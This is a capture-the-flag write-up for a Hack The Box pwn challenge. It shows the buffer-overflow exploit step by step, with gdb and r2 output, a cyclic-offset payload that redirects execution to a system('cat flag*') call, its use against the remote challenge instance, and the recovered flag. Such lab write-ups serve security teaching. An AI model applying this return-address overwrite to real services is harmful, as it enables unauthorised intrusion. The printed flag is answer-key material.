# Space pirate: Going Deeper

## CHALLENGE INFO

> We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. Can you disable the mechanisms and take control of the Admin Panel?

### Resources
- Docker instance: `188.166.172.138:30681`
- Downloadable part: `pwn_sp_going_deeper.zip`

## Enumeration

We are provided with the file; `pwn_sp_going_deeper.zip`. Let's unzip and have a look:

```bash
$ unzip pwn_sp_going_deeper.zip
Archive:  pwn_sp_going_deeper.zip
   creating: challenge/
  inflating: challenge/sp_going_deeper
   creating: challenge/glibc/
  inflating: challenge/glibc/libc.so.6
  inflating: challenge/glibc/ld-linux-x86-64.so.2
 extracting: challenge/flag.txt

$ cd challenge/

$ file *
flag.txt:        ASCII text
glibc:           directory
sp_going_deeper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9f094957db0c2401b2ba895893f94941d618463e, not stripped

$ checksec sp_going_deeper
[*] '/home/hag/ctf/htb-cyber-apocalypse-2022/pwn/space-pirate-going-deeper/challenge/sp_going_deeper'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

Let's play around with the executable:

```bash
$ ./sp_going_deeper


                  Trying to leak information from the pc.. 🖥️


             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   | goldenfang@d12:$ history                    |    |
           |   |     1 ls                                    |    |
           |   |     2 mv secret_pass.txt flag.txt           |    |
           |   |     3 chmod -x missile_launcher.py          |    |
           |   |     4 ls                                    |    |
           |   |     5 history                               |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


[*] Safety mechanisms are enabled!
[*] Values are set to: a = [1], b = [2], c = [3].
[*] If you want to continue, disable the mechanism or login as admin.

1. Disable mechanisms ⚙️
2. Login ✅
3. Exit 🏃
>> 1

[*] Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

[-] Authentication failed!

[!] For security reasons, you are logged out..

Illegal instruction
```

Looks like the program has a buffer overflow and tried to execute bad instructions based on our input. Let's bring out `gdb`, but first let's write a `cyclic` payload to a file:

```bash
$ echo -en "1\n$(cyclic 1024)" > payload
```

The `1\n` part makes sure to select option 1 from the menu before inputting our payload.

Now we use `gdb` and `r < payload` to debug the executable with our payload as the program input.

```
$ gdb sp_going_deeper
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from sp_going_deeper...
(No debugging symbols found in sp_going_deeper)
gef➤  r < payload
Starting program: /home/hag/ctf/htb-cyber-apocalypse-2022/pwn/space-pirate-going-deeper/challenge/sp_going_deeper < payload


                  Trying to leak information from the pc.. 🖥️


             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   | goldenfang@d12:$ history                    |    |
           |   |     1 ls                                    |    |
           |   |     2 mv secret_pass.txt flag.txt           |    |
           |   |     3 chmod -x missile_launcher.py          |    |
           |   |     4 ls                                    |    |
           |   |     5 history                               |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


[*] Safety mechanisms are enabled!
[*] Values are set to: a = [1], b = [2], c = [3].
[*] If you want to continue, disable the mechanism or login as admin.

1. Disable mechanisms ⚙️
2. Login ✅
3. Exit 🏃
>>
[*] Input:
[-] Authentication failed!

[!] For security reasons, you are logged out..


Program received signal SIGILL, Illegal instruction.
0x0000000000400b63 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x31
$rbx   : 0x0
$rcx   : 0x00007ffff7af2104  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7dcf8c0  →  0x0000000000000000
$rsp   : 0x00007fffffffd6c0  →  0x0000000000400ba0  →  <__libc_csu_init+0> push r15
$rbp   : 0x7661616175616161 ("aaauaaav"?)
$rsi   : 0x00007ffff7dce7e3  →  0xdcf8c0000000000a
$rdi   : 0x0
$rip   : 0x0000000000400b63  →  <main+28> (bad)
$r8    : 0x30
$r9    : 0x7
$r10   : 0xfffffff9
$r11   : 0x246
$r12   : 0x00000000004007a0  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffd7c0  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd6c0│+0x0000: 0x0000000000400ba0  →  <__libc_csu_init+0> push r15  ← $rsp
0x00007fffffffd6c8│+0x0008: 0x0000000000000003
0x00007fffffffd6d0│+0x0010: 0x0000000000000002
0x00007fffffffd6d8│+0x0018: 0x0000000000000001
0x00007fffffffd6e0│+0x0020: 0x0000000000400ba0  →  <__libc_csu_init+0> push r15
0x00007fffffffd6e8│+0x0028: 0x00007ffff7a03c87  →  <__libc_start_main+231> mov edi, eax
0x00007fffffffd6f0│+0x0030: 0x0000000000000001
0x00007fffffffd6f8│+0x0038: 0x00007fffffffd7c8  →  0x00007fffffffda4f  →  "/home/hag/ctf/htb-cyber-apocalypse-2022/pwn/space-[...]"
───────────────────────────────────────────────────────────────── code:x86:64 ────
 →   0x400b63 <main+28>        (bad)
     0x400b64 <main+29>        dec    DWORD PTR [rax-0x39]
     0x400b67 <main+32>        rex.RB clc
     0x400b69 <main+34>        add    DWORD PTR [rax], eax
     0x400b6b <main+36>        add    BYTE PTR [rax], al
     0x400b6d <main+38>        mov    QWORD PTR [rbp-0x10], 0x2
───────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sp_going_deeper", stopped 0x400b63 in main (), reason: SIGILL
─────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400b63 → main()
──────────────────────────────────────────────────────────────────────────────────
gef➤
```

Our payload made it into `rbp`; `$rbp   : 0x7661616175616161 ("aaauaaav"?)`.

Let's find the offset:

```bash
$ cyclic -l aaav
81
```

The offset of `aaav` is 81, let's add 4 to get to the end of `rbp`, that makes the offset 85.

Now we need to figure out where we want to redirect the program flow. Using `r2`, we can have a look at the program.

```bash
$ r2 sp_going_deeper
[0x004007a0]> aaaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x004007a0]> afl
0x004007a0    1 43           entry0
0x004007e0    4 42   -> 37   sym.deregister_tm_clones
0x00400810    4 58   -> 55   sym.register_tm_clones
0x00400850    3 34   -> 29   sym.__do_global_dtors_aux
0x00400880    1 7            entry.init0
0x00400c10    1 2            sym.__libc_csu_fini
0x00400c14    1 9            sym._fini
0x004009e9   18 350          sym.admin_panel
0x004008dd    1 191          sym.banner
0x00400750    1 6            sym.imp.time
0x00400740    1 6            sym.imp.srand
0x00400790    1 6            sym.imp.rand
0x004006f0    1 6            sym.imp.puts
0x00400ba0    4 101          sym.__libc_csu_init
0x004007d0    1 2            sym._dl_relocate_static_pie
0x00400b47    1 84           main
0x0040099c    1 77           sym.setup
0x00400760    1 6            sym.imp.setvbuf
0x00400720    1 6            sym.imp.alarm
0x00400887    1 86           sym.read_num
0x00400730    1 6            sym.imp.read
0x00400770    1 6            sym.imp.strtoul
0x004006b8    3 23           sym._init
0x004006e0    1 6            sym.imp.strncmp
0x00400700    1 6            sym.imp.system
0x00400710    1 6            sym.imp.printf
0x00400780    1 6            sym.imp.exit
[0x004007a0]> pdf@main
            ; DATA XREF from entry0 @ 0x4007bd
┌ 84: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_18h @ rbp-0x18
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_8h @ rbp-0x8
│           0x00400b47      55             push rbp
│           0x00400b48      4889e5         mov rbp, rsp
│           0x00400b4b      4883ec20       sub rsp, 0x20
│           0x00400b4f      e848feffff     call sym.setup
│           0x00400b54      e884fdffff     call sym.banner
│           0x00400b59      488d3de80000.  lea rdi, str.e_1_34m        ; 0x400c48 ; const char *s
│           0x00400b60      e88bfbffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400b65      48c745f80100.  mov qword [var_8h], 1
│           0x00400b6d      48c745f00200.  mov qword [var_10h], 2
│           0x00400b75      48c745e80300.  mov qword [var_18h], 3
│           0x00400b7d      488b55e8       mov rdx, qword [var_18h]    ; int64_t arg3
│           0x00400b81      488b4df0       mov rcx, qword [var_10h]
│           0x00400b85      488b45f8       mov rax, qword [var_8h]
│           0x00400b89      4889ce         mov rsi, rcx                ; int64_t arg2
│           0x00400b8c      4889c7         mov rdi, rax                ; int64_t arg1
│           0x00400b8f      e855feffff     call sym.admin_panel
│           0x00400b94      b800000000     mov eax, 0
│           0x00400b99      c9             leave
└           0x00400b9a      c3             ret
[0x004007a0]> pdf@sym.admin_panel
            ; CALL XREF from main @ 0x400b8f
┌ 350: sym.admin_panel (uint32_t arg1, uint32_t arg2, uint32_t arg3);
│           ; var uint32_t var_48h @ rbp-0x48
│           ; var uint32_t var_40h @ rbp-0x40
│           ; var uint32_t var_38h @ rbp-0x38
│           ; var char *buf @ rbp-0x30
│           ; var uint32_t var_8h @ rbp-0x8
│           ; arg uint32_t arg1 @ rdi
│           ; arg uint32_t arg2 @ rsi
│           ; arg uint32_t arg3 @ rdx
│           0x004009e9      55             push rbp
│           0x004009ea      4889e5         mov rbp, rsp
│           0x004009ed      4883ec50       sub rsp, 0x50
│           0x004009f1      48897dc8       mov qword [var_38h], rdi    ; arg1
│           0x004009f5      488975c0       mov qword [var_40h], rsi    ; arg2
│           0x004009f9      488955b8       mov qword [var_48h], rdx    ; arg3
│           0x004009fd      48c745f80000.  mov qword [var_8h], 0
│           0x00400a05      488b4db8       mov rcx, qword [var_48h]
│           0x00400a09      488b55c0       mov rdx, qword [var_40h]
│           0x00400a0d      488b45c8       mov rax, qword [var_38h]
│           0x00400a11      4889c6         mov rsi, rax
│           0x00400a14      488d3d250a00.  lea rdi, str.___Safety_mechanisms_are_enabled__n___Values_are_set_to:_a____x___b____ld___c____ld_._n___If_you_want_to_continue__disable_the_mechanism_or_login_as_admin._n ; 0x401440 ; "[*] Safety mechanisms are enabled!\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld].\n[*] If you want to continue, disable the mechanism or login as admin.\n" ; const char *format
│           0x00400a1b      b800000000     mov eax, 0
│           0x00400a20      e8ebfcffff     call sym.imp.printf         ; int printf(const char *format)
│       ┌─< 0x00400a25      eb1f           jmp 0x400a46
│       │   ; CODE XREF from sym.admin_panel @ 0x400a59
│      ┌──> 0x00400a27      488d3dba0a00.  lea rdi, str._n1._Disable_mechanisms_ ; 0x4014e8 ; "\n1. Disable mechanisms \u2699\ufe0f\n2. Login \u2705\n3. Exit \U0001f3c3\n>> " ; const char *format
│      ╎│   0x00400a2e      b800000000     mov eax, 0
│      ╎│   0x00400a33      e8d8fcffff     call sym.imp.printf         ; int printf(const char *format)
│      ╎│   0x00400a38      b800000000     mov eax, 0
│      ╎│   0x00400a3d      e845feffff     call sym.read_num
│      ╎│   0x00400a42      488945f8       mov qword [var_8h], rax
│      ╎│   ; CODE XREF from sym.admin_panel @ 0x400a25
│      ╎└─> 0x00400a46      48837df801     cmp qword [var_8h], 1
│      ╎┌─< 0x00400a4b      740e           je 0x400a5b
│      ╎│   0x00400a4d      48837df802     cmp qword [var_8h], 2
│     ┌───< 0x00400a52      7407           je 0x400a5b
│     │╎│   0x00400a54      48837df803     cmp qword [var_8h], 3
│     │└──< 0x00400a59      75cc           jne 0x400a27
│     │ │   ; CODE XREFS from sym.admin_panel @ 0x400a4b, 0x400a52
│     └─└─> 0x00400a5b      488b45f8       mov rax, qword [var_8h]
│           0x00400a5f      4883f801       cmp rax, 1                  ; 1
│       ┌─< 0x00400a63      7408           je 0x400a6d
│       │   0x00400a65      4883f802       cmp rax, 2                  ; 2
│      ┌──< 0x00400a69      7415           je 0x400a80
│     ┌───< 0x00400a6b      eb26           jmp 0x400a93
│     │││   ; CODE XREF from sym.admin_panel @ 0x400a63
│     ││└─> 0x00400a6d      488d3db00a00.  lea rdi, str._n___Input:_   ; 0x401524 ; "\n[*] Input: " ; const char *format
│     ││    0x00400a74      b800000000     mov eax, 0
│     ││    0x00400a79      e892fcffff     call sym.imp.printf         ; int printf(const char *format)
│     ││┌─< 0x00400a7e      eb29           jmp 0x400aa9
│     │││   ; CODE XREF from sym.admin_panel @ 0x400a69
│     │└──> 0x00400a80      488d3daa0a00.  lea rdi, str._n___Username:_ ; 0x401531 ; "\n[*] Username: " ; const char *format
│     │ │   0x00400a87      b800000000     mov eax, 0
│     │ │   0x00400a8c      e87ffcffff     call sym.imp.printf         ; int printf(const char *format)
│     │┌──< 0x00400a91      eb16           jmp 0x400aa9
│     │││   ; CODE XREF from sym.admin_panel @ 0x400a6b
│     └───> 0x00400a93      488d3da70a00.  lea rdi, str._n____Exiting.._n ; 0x401541 ; "\n[!] Exiting..\n" ; const char *s
│      ││   0x00400a9a      e851fcffff     call sym.imp.puts           ; int puts(const char *s)
│      ││   0x00400a9f      bf391b0000     mov edi, 0x1b39             ; '9'
│      ││   0x00400aa4      e8d7fcffff     call sym.imp.exit
│      ││   ; CODE XREFS from sym.admin_panel @ 0x400a7e, 0x400a91
│      └└─> 0x00400aa9      488d45d0       lea rax, [buf]
│           0x00400aad      ba39000000     mov edx, 0x39               ; '9' ; 57 ; size_t nbyte
│           0x00400ab2      4889c6         mov rsi, rax                ; void *buf
│           0x00400ab5      bf00000000     mov edi, 0                  ; int fildes
│           0x00400aba      e871fcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00400abf      b8efbeadde     mov eax, 0xdeadbeef
│           0x00400ac4      483945c8       cmp qword [var_38h], rax
│       ┌─< 0x00400ac8      7514           jne 0x400ade
│       │   0x00400aca      48817dc0dec0.  cmp qword [var_40h], 0x1337c0de
│      ┌──< 0x00400ad2      750a           jne 0x400ade
│      ││   0x00400ad4      48817db8efbe.  cmp qword [var_48h], 0x1337beef
│     ┌───< 0x00400adc      741c           je 0x400afa
│     │││   ; CODE XREFS from sym.admin_panel @ 0x400ac8, 0x400ad2
│     │└└─> 0x00400ade      488d45d0       lea rax, [buf]
│     │     0x00400ae2      ba34000000     mov edx, 0x34               ; '4' ; 52 ; size_t n
│     │     0x00400ae7      4889c6         mov rsi, rax                ; const char *s2
│     │     0x00400aea      488d3d670a00.  lea rdi, str.DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft ; 0x401558 ; "DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft" ; const char *s1
│     │     0x00400af1      e8eafbffff     call sym.imp.strncmp        ; int strncmp(const char *s1, const char *s2, size_t n)
│     │     0x00400af6      85c0           test eax, eax
│     │ ┌─< 0x00400af8      7526           jne 0x400b20
│     │ │   ; CODE XREF from sym.admin_panel @ 0x400adc
│     └───> 0x00400afa      488d35370100.  lea rsi, str.e_1_32m        ; 0x400c38
│       │   0x00400b01      488d3d880a00.  lea rdi, str._n_s___Welcome_admin__The_secret_message_is:_ ; 0x401590 ; "\n%s[+] Welcome admin! The secret message is: " ; const char *format
│       │   0x00400b08      b800000000     mov eax, 0
│       │   0x00400b0d      e8fefbffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x00400b12      488d3da50a00.  lea rdi, str.cat_flag       ; 0x4015be ; "cat flag*" ; const char *string
│       │   0x00400b19      e8e2fbffff     call sym.imp.system         ; int system(const char *string)
│      ┌──< 0x00400b1e      eb18           jmp 0x400b38
│      ││   ; CODE XREF from sym.admin_panel @ 0x400af8
│      │└─> 0x00400b20      488d35190100.  lea rsi, str.e_1_31m        ; 0x400c40
│      │    0x00400b27      488d3d9a0a00.  lea rdi, str._n_s____Authentication_failed__n ; 0x4015c8 ; "\n%s[-] Authentication failed!\n" ; const char *format
│      │    0x00400b2e      b800000000     mov eax, 0
│      │    0x00400b33      e8d8fbffff     call sym.imp.printf         ; int printf(const char *format)
│      │    ; CODE XREF from sym.admin_panel @ 0x400b1e
│      └──> 0x00400b38      488d3da90a00.  lea rdi, str._n____For_security_reasons__you_are_logged_out.._n ; 0x4015e8 ; "\n[!] For security reasons, you are logged out..\n" ; const char *s
│           0x00400b3f      e8acfbffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400b44      90             nop
│           0x00400b45      c9             leave
└           0x00400b46      c3             ret
[0x004007a0]>
```

We use `aaaaa` to analyze the program and `afl` to list available functions. Then we use `pdf@main` to disassemble the `main` function. The `main` function basically just calls into the `sym.admin_panel` function, so we disassemble that with `pdf@sym.admin_panel`.

We can see that there is some logic to see which menu option we choose and then some logic to check our input to see if we are the `admin`.

However, if we look further down below the checks, we get to the interesting part:

```bash
0x00400b12      488d3da50a00.  lea rdi, str.cat_flag       ; 0x4015be ; "cat flag*" ; const char *string
0x00400b19      e8e2fbffff     call sym.imp.system         ; int system(const char *string)
```

How about we just try to change the program flow and go straight to the part that gives us the flag?

We need the address to jump to, which we can find above. We want the address; `0x00400b12`. This is where the `cat flag*` string is loaded before the call to `system` happens.

Let's update our payload. We need to add the address in little-endian format. So `0x00400b12` becomes `\x12\x0B\x40` using escaped bytes:

```bash
$ echo -en "1\n$(cyclic 85)\x12\x0B\x40" > payload
```

Let's run the program locally with our payload again:

```bash
gef➤  r < payload
Starting program: /home/hag/ctf/htb-cyber-apocalypse-2022/pwn/space-pirate-going-deeper/challenge/sp_going_deeper < payload


                  Trying to leak information from the pc.. 🖥️


             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   | goldenfang@d12:$ history                    |    |
           |   |     1 ls                                    |    |
           |   |     2 mv secret_pass.txt flag.txt           |    |
           |   |     3 chmod -x missile_launcher.py          |    |
           |   |     4 ls                                    |    |
           |   |     5 history                               |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


[*] Safety mechanisms are enabled!
[*] Values are set to: a = [1], b = [2], c = [3].
[*] If you want to continue, disable the mechanism or login as admin.

1. Disable mechanisms ⚙️
2. Login ✅
3. Exit 🏃
>>
[*] Input:
[-] Authentication failed!

[!] For security reasons, you are logged out..

[Detaching after fork from child process 2350]
HTB{f4k3_fl4g_4_t35t1ng}

[!] For security reasons, you are logged out..


Program received signal SIGBUS, Bus error.
0x0000000000400b45 in admin_panel ()
```

Success! We can see the fake flag; `HTB{f4k3_fl4g_4_t35t1ng}`.

Now let's try the payload on the remote service:

```bash
$ echo -en "1\n$(cyclic 85)\x12\x0B\x40" | nc 188.166.172.138 30681


                  Trying to leak information from the pc.. 🖥️


             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   | goldenfang@d12:$ history                    |    |
           |   |     1 ls                                    |    |
           |   |     2 mv secret_pass.txt flag.txt           |    |
           |   |     3 chmod -x missile_launcher.py          |    |
           |   |     4 ls                                    |    |
           |   |     5 history                               |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


[*] Safety mechanisms are enabled!
[*] Values are set to: a = [1], b = [2], c = [3].
[*] If you want to continue, disable the mechanism or login as admin.

1. Disable mechanisms ⚙️
2. Login ✅
3. Exit 🏃
>>
[*] Input:
[-] Authentication failed!

[!] For security reasons, you are logged out..

HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}
[!] For security reasons, you are logged out..

```

It works!

## Flag

`HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}`
